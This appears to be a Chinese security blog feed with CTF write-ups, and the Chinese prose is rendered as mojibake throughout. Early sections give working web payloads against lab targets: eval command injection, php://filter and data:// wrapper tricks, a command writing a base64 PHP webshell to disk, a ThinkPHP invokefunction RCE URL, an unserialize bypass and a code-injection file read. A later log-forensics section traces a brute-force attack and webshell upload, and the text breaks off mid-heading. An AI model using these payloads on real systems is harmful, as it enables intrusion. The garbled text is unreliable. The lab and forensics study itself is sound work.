2020]easycon</h4><p>å¾ˆç®€å•çš„é¢˜ï¼Œè®¿é—®ç½‘ç«™ï¼Œè·³åˆ°äº†apache2çš„ä½¿ç”¨é¡µé¢ï¼Œè®¿é—®index.php,è·³åˆ°é¡µé¢ï¼Œå¼¹çª—æç¤ºï¼Œ<code>eval cmd post</code> é‚£ä¹ˆå°±ç›´æ¥cmd=phpinfo();,ç¿»äº†ä¸€åœˆæ²¡æ‰¾åˆ°flagï¼Œå‘ç°æœ‰ä¸ªbbbbbb.txt ,ç›´æ¥ç”¨å¨å­è§£ä¸‹</p><p>æœ‰ä¸ªå›¾ç‰‡ï¼Œå°±å‡ºflagäº†ã€‚</p><p><img src="/images/others/image-20230630155457254.png" alt="image-20230630155457254"></p><h4 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-PseudoProtocols"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-PseudoProtocols" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]PseudoProtocols"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]PseudoProtocols</h4><p>ç›´æ¥phpä¼ªåè®®è¯»å–hint.php</p><p><code>http://node2.anna.nssctf.cn:28419/index.php?wllm=php://filter/convert.base64-encode/resource=hint.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(file_get_contents(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥è¯»å³å¯<code>http://node2.anna.nssctf.cn:28419/test2222222222222.php?a=data://text/plain,I want flag</code></p><h4 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-ez-rce"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-ez-rce" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_rce"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_rce</h4><p>echo â€œPD9waHAgZXZhbCgkX1BPU1RbYV0pOz8+â€ | base64 -d &gt; s.php</p><p>PD9waHAgQGV2YWwoJF9QT1NUWydnJ10pOz8+</p><p><a href="http://node1.anna.nssctf.cn:28306/NSS/in1dex.php?s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=">http://node1.anna.nssctf.cn:28306/NSS/in1dex.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=</a></p><h4 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>=&gt;<span class="literal">true</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>=&gt;<span class="literal">true</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$serialized_data</span> = serialize(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$serialized_data</span> ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">?info=a:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;b:<span class="number">1</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><h4 id="UUCTF-2022-æ–°ç”Ÿèµ›-ez-rceå·²è§£å†³"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ez-rceå·²è§£å†³" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ez_rceå·²è§£å†³"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ez_rceå·²è§£å†³</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node1.anna.nssctf.cn:28921/?code=?&gt;&lt;?=`nl /fffffffffflagafag`;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> æµé‡åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfmiscåˆ·é¢˜è®°å½•</title>
      <link href="/2023/06/14/ctfmisc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/06/14/ctfmisc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬å››å±Š&quot;é•¿åŸæ¯&quot;ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›wp-æº¯æºå–è¯wp</title>
      <link href="/2023/05/05/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B-%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81wp/"/>
      <url>/2023/05/05/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B-%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81wp/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰é¢"><a href="#å‰é¢" class="headerlink" title="å‰é¢"></a>å‰é¢</h3><p>æº¯æºå–è¯æœ¬æ¥ä»¥ä¸ºæ˜¯wiresharkåŒ…çš„ï¼Œæ²¡æƒ³åˆ°è¿™æ¬¡éƒ½æ˜¯æ—¥å¿—åŒ…ï¼Œæ€»å…±æœ‰ä¸¤ä¸ªæ—¥å¿—åŒ…ï¼Œä¸€ä¸ªæ˜¯è¯¦ç»†çš„ï¼Œä¸€ä¸ªæ˜¯ä¸è¯¦ç»†çš„ã€‚</p><h3 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h3><p>1ï¼Œé»‘å®¢æ”»å‡»æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„å†…ç½‘ipä¸ºå¤šå°‘</p><p>2ï¼Œé»‘å®¢å—¦è¿›è¡Œçš„ç›®å½•æ‰«æä¸€å…±æœ‰å¤šå°‘æ¡</p><p>3ï¼Œé»‘å®¢è¿›è¡Œè´¦å·å¯†ç çˆ†ç ´çš„æ¬¡æ•°</p><p>ä¸‹é¢å‡ ä¸ªæ²¡æœ‰æˆªå›¾ï¼Œä¸è¿‡è®°ä½å¤§æ¦‚äº†</p><p>4ï¼Œé»‘å®¢ç™»å½•æ—¶ä½¿ç”¨çš„è´¦å·å¯†ç ä¸ºå¤šå°‘ï¼Œæ ¼å¼è´¦å·ã€å¯†ç </p><p>5ï¼Œé»‘å®¢æ·»åŠ çš„emailåœ°å€ä¸ºå¤šå°‘</p><p>6ï¼Œé»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ æœ¨é©¬çš„ç»å¯¹è·¯å¾„ä¸ºå¤šå°‘ï¼Œè¯¥æœ¨é©¬æœªè¢«ä½¿ç”¨</p><p>ä¸‹é¢æ˜¯æ²¡æœ‰åšå‡ºæ¥çš„äº†ï¼Œæœ¬ç¯‡æ–‡ç« å°†ä»”ç»†åˆ†æ</p><p>7ï¼Œé»‘å®¢ä¸Šä¼ çš„æœ¨é©¬æ–¹å¼ä¸ºä»€ä¹ˆï¼Œæœ¨é©¬å¯†ç ä¸ºä»€ä¹ˆï¼Œå¤§å†™å­—æ¯ï¼Œç”¨ç©ºæ ¼åˆ†å¼€</p><p>8ï¼Œ9ï¼Œ10å°±ä¸å¤ªæ¸…æ¥šäº†ï¼Œè‚¯å®šæ˜¯ä¸€äº›åˆ©ç”¨æœ¨é©¬æ‰€æ“ä½œçš„å†…å®¹äº†ï¼Œèµ›åé—®å…¶ä»–å¤§å¸ˆå‚…ï¼Œæœ‰åå¼¹shellçš„ipï¼Œportå•¥çš„ï¼Œå› ä¸ºåé¢åˆ©ç”¨æœ¨é©¬çš„æ¬¡æ•°æ¯”è¾ƒå°‘ï¼Œæˆ‘ä»¬éƒ½åˆ†æä¸€ä¸‹ã€‚</p><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>è¿™é‡Œæ²¡æœ‰æŠŠæ•´ä¸ªç½‘ç«™ç›®å½•æ‰“åŒ…ï¼ŒåªæŠŠé‡è¦æ—¥å¿—ç•™äº†ä¸‹æ¥ï¼Œ</p><p>æœ‰éœ€è¦çš„å¸ˆå‚…å¯ä»¥ä¸‹è½½ä¸€ä¸‹ã€‚</p><p><a href="/images/tiesan/t3.7z">æµé‡åŒ…ä¸‹è½½</a></p><h4 id="1é»‘å®¢æ”»å‡»æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„å†…ç½‘ipä¸ºå¤šå°‘"><a href="#1é»‘å®¢æ”»å‡»æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„å†…ç½‘ipä¸ºå¤šå°‘" class="headerlink" title="1é»‘å®¢æ”»å‡»æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„å†…ç½‘ipä¸ºå¤šå°‘"></a>1é»‘å®¢æ”»å‡»æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„å†…ç½‘ipä¸ºå¤šå°‘</h4><p>åœ¨æ¯”èµ›ç°åœºï¼Œwebçš„ç½‘ç«™åœ¨/var/www/html/ä¸‹</p><p>webæ—¥å¿—åœ¨/var/log/httpd/ä¸‹ï¼Œæœ‰å¾ˆå¤šæ—¥å¿—æ–‡ä»¶,è¿™é‡Œå¤ä¹ åŸå› ï¼Œæˆ‘ä»¬å…ˆæŠŠæ—¥å¿—æ‹–åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Š</p><p><img src="/images/tiesan/image-20230505140424354.png" alt="image-20230505140424354"></p><p>ç¬¬ä¸€ä¸ªå¾ˆç®€å•ï¼Œå› ä¸ºå¦‚æœcatçš„è¯ï¼Œå¤ªé•¿äº†ï¼Œæˆ‘ä»¬ä½¿ç”¨head æŸ¥çœ‹å‰å‡ ä¸ªå°±è¡Œï¼Œ</p><p>``head -n 10 access_log-20230426`</p><p><img src="/images/tiesan/image-20230505140539840.png" alt="image-20230505140539840"></p><p>å¯ä»¥çœ‹åˆ°192.168.12.140å¯¹æœåŠ¡å™¨è¿›è¡Œäº†è¯·æ±‚ï¼Œuser-agentä¸ºâ€œMozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0â€ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æ­£å¸¸çš„è¯·æ±‚ï¼Œæ¥ç€<code> head -n 100 access_log-20230426</code>çœ‹100æ¡æ—¥å¿—æ—¶ï¼Œ</p><p><img src="/images/tiesan/image-20230505141009132.png" alt="image-20230505141009132"></p><p>å°±å¯ä»¥çœ‹åˆ°åŸºæœ¬éƒ½æ˜¯404 ä¸”user-agentä¸ºâ€Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)â€è¿™ç§user-agentä¸€èˆ¬éƒ½ä¸æ˜¯æ­£å¸¸æœºå™¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ¤æ–­æ”»å‡»ipä¸º<code>192.168.12.140</code></p><p>flag:192.168.12.140</p><p><img src="/images/tiesan/image-20230505141302281.png" alt="image-20230505141302281"></p><h4 id="2é»‘å®¢æ‰€è¿›è¡Œçš„ç›®å½•æ‰«æä¸€å…±æœ‰å¤šå°‘æ¡"><a href="#2é»‘å®¢æ‰€è¿›è¡Œçš„ç›®å½•æ‰«æä¸€å…±æœ‰å¤šå°‘æ¡" class="headerlink" title="2é»‘å®¢æ‰€è¿›è¡Œçš„ç›®å½•æ‰«æä¸€å…±æœ‰å¤šå°‘æ¡"></a>2é»‘å®¢æ‰€è¿›è¡Œçš„ç›®å½•æ‰«æä¸€å…±æœ‰å¤šå°‘æ¡</h4><p>è¿™é‡Œä¸€æ¡ä¸€æ¡çš„æ•°è‚¯å®šä¸ç°å®ï¼Œå¯ä»¥grepè¿›è¡ŒåŒ¹é…ï¼Œç„¶åwcè¿›è¡Œè®¡æ•°ï¼ŒåŒ¹é…è¯ï¼Œæˆ‘ä»¬è¿›è¡Œuser-agentåŒ¹é…ï¼Œä¸Šé¢å·²ç»çœ‹åˆ°å¾ˆå¤š404çš„user-agentä¸ºâ€Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)â€,æˆ‘ä»¬ä½¿ç”¨å‘½ä»¤</p><p><code> cat access_log-20230426 | grep &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&quot; | wc -l</code></p><p><img src="/images/tiesan/image-20230505141553056.png" alt="image-20230505141553056"></p><p>å³å¯å¾—å‡ºç­”æ¡ˆ</p><p>flag 55510</p><p><img src="/images/tiesan/image-20230505141628382.png" alt="image-20230505141628382"></p><h4 id="3é»‘å®¢è¿›è¡Œè´¦å·å¯†ç çˆ†ç ´çš„æ¬¡æ•°"><a href="#3é»‘å®¢è¿›è¡Œè´¦å·å¯†ç çˆ†ç ´çš„æ¬¡æ•°" class="headerlink" title="3é»‘å®¢è¿›è¡Œè´¦å·å¯†ç çˆ†ç ´çš„æ¬¡æ•°"></a>3é»‘å®¢è¿›è¡Œè´¦å·å¯†ç çˆ†ç ´çš„æ¬¡æ•°</h4><p>è¿™é‡Œçˆ†ç ´æ¬¡æ•°ï¼Œå› ä¸ºå½“æ—¶æ¯”èµ›ç¯å¢ƒå®•æœºäº†ï¼Œå®ƒç°åœºé‚£ä¸ªwebï¼Œvncæ€»æ˜¯404ï¼Œè£åˆ¤é‚£è¾¹æŠŠæœåŠ¡å™¨è´¦å·å¯†ç éƒ½ç»™äº†ï¼Œsshèƒ½è¿æ¥ï¼Œæ‰€ä»¥å°±æŠŠæ—¥å¿—ä¸‹è½½ä¸‹æ¥äº†ï¼Œæ—¥å¿—å¤ªå¤§è®°äº‹æœ¬ä¸è¡Œï¼Œå‡ ä¸‡è¡Œå’Œå‡ ç™¾ä¸‡è¡Œçš„æ•°æ®ï¼Œåœ¨åšçš„æ—¶å€™ï¼Œç”¨ä¸€äº›å…¶ä»–ç¼–è¾‘å™¨æ‰“å¼€çš„æ—¶å€™ï¼Œä¼šåŒ¹é…ä¸åˆ°å„ç§å­—ç¬¦ï¼Œæœ€åç”¨vscodeåŒ¹é…ï¼Œå¾ˆæµç•…ä¸”ä¸æ»‘ã€‚</p><p>ç™»å½•çš„è¯ï¼Œä¸€èˆ¬éƒ½æ˜¯ä¼šæœ‰login ç™»å½•å…³é”®è¯ï¼Œæˆ‘ä»¬ç›´æ¥åŒ¹é…loginï¼Œ<code>cat access_log-20230426 | grep &quot;login&quot;</code></p><p><img src="/images/tiesan/image-20230505142323914.png" alt="image-20230505142323914"></p><p><img src="/images/tiesan/image-20230505142400480.png" alt="image-20230505142400480"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ‰çˆ†ç ´çš„ç—•è¿¹ï¼Œå› ä¸ºåœ¨ä¸Šé¢çˆ†ç ´ç›®å½•çš„æ—¶å€™ï¼Œä¹Ÿä¼šå­˜åœ¨loginï¼Œæ‰€ä»¥ä¸ºæˆ‘ä»¬å¯ä»¥åŒ¹é…â€œ/index.php?c=access&amp;a=loginâ€è¿™ä¸ªï¼Œè¿™æ ·å°±å°‘ä¸€ç‚¹</p><p><code> cat access_log-20230426 | grep &quot;index.php?c=access&amp;a=login&quot;</code></p><p><img src="/images/tiesan/image-20230505142936437.png" alt="image-20230505142936437"></p><p>è¿™æ ·åŒ¹é…ä¸‹æ¥ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šæœ‰getå’Œpostå½¢å¼çš„ï¼Œæœ€é‡è¦å¯ä»¥çœ‹åˆ°å‰é¢å‡ æ¡ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥åŒ¹é…è¿™ä¸ªhydraçš„çˆ†ç ´â€Mozilla/5.0 (Hydra)â€</p><p>root@Bohemian:/tools/tiesan# cat access_log-20230426 | grep â€œMozilla/5.0 (Hydra)â€ | wc -l</p><p><img src="/images/tiesan/image-20230505143241531.png" alt="image-20230505143241531"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯è¿™ä¹ˆå¤šæ¡ï¼Œä½†æ˜¯å…¶ä¸­ä¹ŸåŒ…å«äº†getè¯·æ±‚çš„ï¼Œhydraåœ¨çˆ†ç ´ç½‘é¡µçš„åŒæ—¶ä¼šå…ˆè¯·æ±‚ä¸€ä¸‹æ˜¯å¦å­˜åœ¨ï¼Œé‚£å°±è¦å»æ‰GET</p><p>ç›´æ¥åœ¨åŒ¹é…<code>cat access_log-20230426 | grep &quot;Mozilla/5.0 (Hydra)&quot; |grep &quot;POST /index.php?c=access&amp;a=login HTTP/1.0&quot; |wc -l</code></p><p><img src="/images/tiesan/image-20230505143558618.png" alt="image-20230505143558618"></p><p>flag 2051</p><p><img src="/images/tiesan/image-20230505143616122.png" alt="image-20230505143616122"></p><h4 id="4é»‘å®¢ç™»å½•æˆåŠŸæ‰€ç”¨çš„è´¦å·å¯†ç "><a href="#4é»‘å®¢ç™»å½•æˆåŠŸæ‰€ç”¨çš„è´¦å·å¯†ç " class="headerlink" title="4é»‘å®¢ç™»å½•æˆåŠŸæ‰€ç”¨çš„è´¦å·å¯†ç "></a>4é»‘å®¢ç™»å½•æˆåŠŸæ‰€ç”¨çš„è´¦å·å¯†ç </h4><p>è¿™é‡Œè´¦å·å¯†ç çˆ†ç ´ï¼Œè‚¯å®šä¸åœ¨è¿™ä¸ªaccessçš„æ—¥å¿—ä¸­äº†ï¼Œä¼šæœ‰ä¸€ä¸ªè¯¦ç»†æ—¥å¿—åŒ…ï¼Œå°±æ˜¯ modsec_audit.log-20230426</p><p>4.26çš„æ—¥å¿—åŒ…</p><p><img src="/images/tiesan/image-20230505143833110.png" alt="image-20230505143833110"></p><p>æˆ‘ä»¬å†æ¬¡å›åˆ°ä¸Šé¢åŒ¹é…ç™»å½•å“ªé‡Œï¼Œå¯ä»¥çœ‹åˆ°ï¼Œhydraçˆ†ç ´æ—¶ï¼Œæœ€åæœ‰ä¸€ä¸ªç™»å½•çš„302çŠ¶æ€ç ï¼Œè¯´æ˜ç™»å½•æˆåŠŸï¼Œæ—¶é—´ä¸ºâ€œ [04/Dec/2019:16:22:34 +0800] â€ï¼Œæˆ‘ä»¬ç›´æ¥å»è¯¦ç»†æ—¥å¿—ä¸­æœç´¢ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åœ¨linuxåŒ¹é…ï¼Œä½†æ˜¯ä¸å»ºè®®ï¼Œå› ä¸ºä»–éƒ½æ˜¯åŒ¹é…ä¸€è¡Œï¼Œæœ‰ç‚¹éº»çƒ¦ï¼Œç›´æ¥æœ16:22:34</p><p><img src="/images/tiesan/image-20230505144150344.png" alt="image-20230505144150344"></p><p>å°±å¯ä»¥çœ‹åˆ°è´¦å·å¯†ç äº†ï¼Œlogin%5Busername%5D=admin&amp;login%5Bpassword%5D=p455w0rd&amp;configOptionSelect=Default</p><p>è´¦å·ä¸ºadmin</p><p>å¯†ç ä¸ºp455w0rd</p><p>flag admin/p455w0rd</p><h4 id="5é»‘å®¢æ·»åŠ çš„emailåœ°å€ä¸ºå¤šå°‘"><a href="#5é»‘å®¢æ·»åŠ çš„emailåœ°å€ä¸ºå¤šå°‘" class="headerlink" title="5é»‘å®¢æ·»åŠ çš„emailåœ°å€ä¸ºå¤šå°‘"></a>5é»‘å®¢æ·»åŠ çš„emailåœ°å€ä¸ºå¤šå°‘</h4><p>ä¸€èˆ¬æ¥è¯´ï¼Œemailåœ°å€ä¸€èˆ¬éƒ½æœ‰å…³é”®å­—ä¸ºmailï¼Œç„¶åæ·»åŠ åœ°å€è‚¯å®šæ˜¯é»‘å®¢æ‰€ä¸ºï¼Œè¿™é‡Œä»–çš„user-agentæˆ‘ä»¬å¯ä»¥ä»ä¸Šé¢çŸ¥é“â€Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0â€ï¼Œæˆ‘ä»¬åŒ¹é…è¿™ä¸ªä¹‹ååœ¨åŒ¹é…ä¸€ä¸‹mail<code> cat access_log-20230426 | grep &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot; | grep &quot;mail&quot;</code></p><p><img src="/images/tiesan/image-20230505145108428.png" alt="image-20230505145108428"></p><p>ä»”ç»†çœ‹ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå¯ç–‘é‚®ç®±ï¼Œä¸º<a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x7a;&#x7a;&#x2e;&#x63;&#x6f;&#x6d;">&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x7a;&#x7a;&#x2e;&#x63;&#x6f;&#x6d;</a>ï¼Œå¯ä»¥æäº¤è¯•è¯•ï¼Œè¿™é‡Œå†ä»”ç»†åˆ†æï¼Œå»æœç´¢è¿™ä¸ªé‚®ç®±</p><p><img src="/images/tiesan/image-20230505145238135.png" alt="image-20230505145238135"></p><p>è¿™é‡Œå› ä¸ºåœ¨webé¡µé¢@ä¼šurlç¼–ç ï¼Œæˆ‘ä»¬å°±ç›´æ¥æœzz.comä¸€æ ·çš„ï¼Œå‘ç°ä¸‰ä¸ªï¼Œ</p><p><img src="/images/tiesan/image-20230505145615436.png" alt="image-20230505145615436"></p><p>å…¶ä¸­åœ¨åŒ…å«2495280è¿™ä¸€è¡Œçš„è¿™ä¸ªæ•°æ®åŒ…ä¸ºPOSTä¼ å‚ï¼Œæ‰€ä»¥åˆ¤å®šä¸ºæ·»åŠ çš„email</p><p>flag <a href="mailto:&#x61;&#x64;&#109;&#105;&#110;&#64;&#122;&#122;&#x2e;&#x63;&#111;&#109;">&#x61;&#x64;&#109;&#105;&#110;&#64;&#122;&#122;&#x2e;&#x63;&#111;&#109;</a></p><h4 id="6é»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ æœ¨é©¬çš„ç»å¯¹è·¯å¾„ä¸ºå¤šå°‘ï¼Œè¯¥æœ¨é©¬æœªè¢«ä½¿ç”¨"><a href="#6é»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ æœ¨é©¬çš„ç»å¯¹è·¯å¾„ä¸ºå¤šå°‘ï¼Œè¯¥æœ¨é©¬æœªè¢«ä½¿ç”¨" class="headerlink" title="6é»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ æœ¨é©¬çš„ç»å¯¹è·¯å¾„ä¸ºå¤šå°‘ï¼Œè¯¥æœ¨é©¬æœªè¢«ä½¿ç”¨"></a>6é»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ æœ¨é©¬çš„ç»å¯¹è·¯å¾„ä¸ºå¤šå°‘ï¼Œè¯¥æœ¨é©¬æœªè¢«ä½¿ç”¨</h4><p><code>cat access_log-20230426 | grep &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;</code></p><p>ç»§ç»­ä½¿ç”¨è¿™ä¸ªå‘½ä»¤å»çœ‹é»‘å®¢çš„æ“ä½œï¼Œåœ¨æœ€åé¢å¯ä»¥çœ‹åˆ°</p><p><img src="/images/tiesan/image-20230505150207488.png" alt="image-20230505150207488"></p><p>æœ‰ä¸ª1.phpï¼Œè¿™ä¸ª1.phpåœ¨è¯·æ±‚æ—¶ï¼Œä¸º404ï¼Œæ‰€ä»¥ä¸æ˜¯è¿™ä¸ªæ–‡ä»¶ï¼Œuploadåé¢çš„ä¹Ÿä¸æ˜¯ï¼Œæ¥ç€å¾€ä¸‹ï¼Œæœ‰ä¸€ä¸ªupload/055è¿™é‡Œï¼ŒåŒ¹é…ä¸€ä¸‹ï¼Œ</p><p><img src="/images/tiesan/image-20230505150429344.png" alt="image-20230505150429344"></p><p>å¯ä»¥çœ‹åˆ°æœ‰ç±»ä¼¼çš„æ“ä½œï¼Œæˆ‘ä»¬åˆ°è¯¦ç»†æ—¥å¿—åŒ…ä¸­å—¦ä¸€ä¸‹,å¦‚æœè¦æ˜¯åˆ©ç”¨è¿™ä¸ªæœ¨é©¬ï¼Œé‚£è‚¯å®šéœ€è¦POSTæäº¤ï¼Œæœç´¢<code>POST /upload/055</code></p><p><img src="/images/tiesan/image-20230505151035079.png" alt="image-20230505151035079"></p><p>å‘ç°æœ‰ä¸¤æ¡ï¼Œä¼°è®¡æ—¶è¿æ¥æ—¶çš„è¯·æ±‚ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰åˆ©ç”¨</p><p>å…¶è·¯å¾„ä¸ºâ€œ/upload/055/741/33e/896eee6d3709e7ff535b01986e7de1aâ€</p><p>ä¸å¸¦é‚£ä¸ªæ–‡ä»¶å</p><p>flag <code>/var/www/html//upload/055/741/33e/</code></p><p>ä¸‹é¢çš„å°±æ˜¯æ²¡æœ‰åšå‡ºæ¥çš„äº†</p><h4 id="7é»‘å®¢ä¸Šä¼ çš„æœ¨é©¬æ–¹å¼ä¸ºä»€ä¹ˆï¼Œæœ¨é©¬å¯†ç ä¸ºä»€ä¹ˆï¼Œå¤§å†™å­—æ¯ï¼Œç”¨ç©ºæ ¼åˆ†å¼€"><a href="#7é»‘å®¢ä¸Šä¼ çš„æœ¨é©¬æ–¹å¼ä¸ºä»€ä¹ˆï¼Œæœ¨é©¬å¯†ç ä¸ºä»€ä¹ˆï¼Œå¤§å†™å­—æ¯ï¼Œç”¨ç©ºæ ¼åˆ†å¼€" class="headerlink" title="7é»‘å®¢ä¸Šä¼ çš„æœ¨é©¬æ–¹å¼ä¸ºä»€ä¹ˆï¼Œæœ¨é©¬å¯†ç ä¸ºä»€ä¹ˆï¼Œå¤§å†™å­—æ¯ï¼Œç”¨ç©ºæ 